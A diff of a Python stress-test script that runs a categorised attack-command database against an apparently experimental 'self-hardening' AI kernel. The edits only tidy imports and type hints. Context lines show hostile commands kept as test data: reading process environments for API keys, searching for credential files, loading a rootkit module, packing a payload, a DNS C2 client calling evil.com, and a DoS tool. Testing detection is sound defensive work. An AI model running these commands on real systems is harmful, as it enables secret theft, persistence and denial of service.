@@ -10,18 +10,17 @@ This will demonstrate the self-hardening AI OS capabilities.
 "They will weep from the utter horror and sheer determinism"
 """
 
+import logging
+import random
 import sys
 import time
-import random
-import logging
-from pathlib import Path
-from typing import List, Dict, Any
 from dataclasses import dataclass
+from pathlib import Path
 
 # Add kernel to path
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
-from kernel.thirsty_super_kernel import ThirstySuperKernel, SystemConfig
+from kernel.thirsty_super_kernel import SystemConfig, ThirstySuperKernel
 
 logging.basicConfig(level=logging.WARNING)  # Reduce noise
 logger = logging.getLogger(__name__)
@@ -55,7 +54,7 @@ class DEFCONAttackDatabase:
     def __init__(self):
         self.attacks = self._build_attack_database()
 
-    def _build_attack_database(self) -> Dict[str, List[str]]:
+    def _build_attack_database(self) -> dict[str, list[str]]:
         """Build comprehensive attack command database"""
 
         return {
@@ -70,7 +69,7 @@ class DEFCONAttackDatabase:
             "resource_hijacking": self._resource_hijacking_attacks(),
         }
 
-    def _privilege_escalation_attacks(self) -> List[str]:
+    def _privilege_escalation_attacks(self) -> list[str]:
         """50 variations of privilege escalation"""
         attacks = [
             # SUDO abuse (10 variations)
@@ -131,7 +130,7 @@ class DEFCONAttackDatabase:
         ]
         return attacks
 
-    def _data_exfiltration_attacks(self) -> List[str]:
+    def _data_exfiltration_attacks(self) -> list[str]:
         """50 variations of data exfiltration"""
         return [
             # Network exfiltration (15 variations)
@@ -191,7 +190,7 @@ class DEFCONAttackDatabase:
             "cat /proc/*/environ | grep -i api",
         ]
 
-    def _reconnaissance_attacks(self) -> List[str]:
+    def _reconnaissance_attacks(self) -> list[str]:
         """50 variations of reconnaissance"""
         return [
             # Network scanning (15 variations)
@@ -251,7 +250,7 @@ class DEFCONAttackDatabase:
             "snmpwalk -v2c -c public 192.168.1.1",
         ]
 
-    def _credential_access_attacks(self) -> List[str]:
+    def _credential_access_attacks(self) -> list[str]:
         """50 variations of credential access"""
         return [
             # Password file access (10 variations)
@@ -311,7 +310,7 @@ class DEFCONAttackDatabase:
             "find / -name 'credentials.txt' -o -name 'pass*.txt' 2>/dev/null",
         ]
 
-    def _persistence_attacks(self) -> List[str]:
+    def _persistence_attacks(self) -> list[str]:
         """50 variations of persistence mechanisms"""
         return [
             # Cron jobs (10 variations)
@@ -371,7 +370,7 @@ class DEFCONAttackDatabase:
             "modprobe evil_rootkit",
         ]
 
-    def _lateral_movement_attacks(self) -> List[str]:
+    def _lateral_movement_attacks(self) -> list[str]:
         """50 variations of lateral movement"""
         return [
             # SSH pivoting (15 variations)
@@ -431,7 +430,7 @@ class DEFCONAttackDatabase:
             "kubectl port-forward pod-name 8080:80",
         ]
 
-    def _defense_evasion_attacks(self) -> List[str]:
+    def _defense_evasion_attacks(self) -> list[str]:
         """50 variations of defense evasion"""
         return [
             # Log deletion/manipulation (15 variations)
@@ -491,7 +490,7 @@ class DEFCONAttackDatabase:
             "upx --best --ultra-brute /tmp/payload",
         ]
 
-    def _command_control_attacks(self) -> List[str]:
+    def _command_control_attacks(self) -> list[str]:
         """50 variations of C2 communication"""
         return [
             # Reverse shells (20 variations)
@@ -550,7 +549,7 @@ class DEFCONAttackDatabase:
             "python3 dns-c2-client.py evil.com",
         ]
 
-    def _resource_hijacking_attacks(self) -> List[str]:
+    def _resource_hijacking_attacks(self) -> list[str]:
         """50 variations of resource hijacking (crypto mining, etc)"""
         return [
             # Crypto mining (25 variations)
@@ -609,7 +608,7 @@ class DEFCONAttackDatabase:
             "./hulk.py http://target.com",
         ]
 
-    def get_all_attacks(self) -> List[tuple]:
+    def get_all_attacks(self) -> list[tuple]:
         """Get all attacks as (type, variation_num, command) tuples"""
         all_attacks = []
         for attack_type, commands in self.attacks.items():
@@ -624,7 +623,7 @@ class DEFCONStressTest:
     def __init__(self):
         self.kernel = None
         self.attack_db = DEFCONAttackDatabase()
-        self.results: List[AttackResult] = []
+        self.results: list[AttackResult] = []
 
     def initialize_kernel(self):
         """Initialize the kernel"""
@@ -643,7 +642,7 @@ class DEFCONStressTest:
 
         print("Kernel initialized!")
         print(f"- Version: {self.kernel.VERSION}")
-        print(f"- AI Detection: ACTIVE")
+        print("- AI Detection: ACTIVE")
         print(
             f"- Learning Engine: {'ACTIVE' if hasattr(self.kernel, 'learning_engine') else 'INACTIVE'}"
         )
@@ -655,7 +654,7 @@ class DEFCONStressTest:
         total = len(all_attacks)
 
         print("=" * 80)
-        print(f"COMMENCING ATTACK SEQUENCE")
+        print("COMMENCING ATTACK SEQUENCE")
         print(f"Total Attacks: {total}")
         print("=" * 80)
         print()
